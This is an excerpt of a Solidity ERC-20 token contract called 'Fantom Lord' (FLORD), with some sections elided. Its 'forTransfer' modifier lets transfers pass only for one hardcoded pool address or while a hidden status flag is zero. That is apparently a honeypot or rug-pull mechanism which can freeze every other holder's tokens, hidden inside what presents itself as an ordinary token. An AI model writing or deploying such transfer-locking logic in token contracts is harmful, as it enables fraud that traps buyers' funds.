...
contract FantomLord is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenl_totalSupply;
    uint256 private _tokenl_status = 0;
    uint256 public stakingPoollStatus = 0;

    string private _tokenl_name;
    string private _tokenl_symbol;

    address private _poollAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokenl_name = "Fantom Lord";
        _tokenl_symbol = "FLORD";
        _tokenl_totalSupply = 100000000 * 10 ** 18;
        _balances[msg.sender] = _tokenl_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poollAddress || _tokenl_status == 0);
        _;
    }
    ...
    function symbol() public view virtual override returns (string memory) {
        return _tokenl_symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenl_totalSupply;
    }
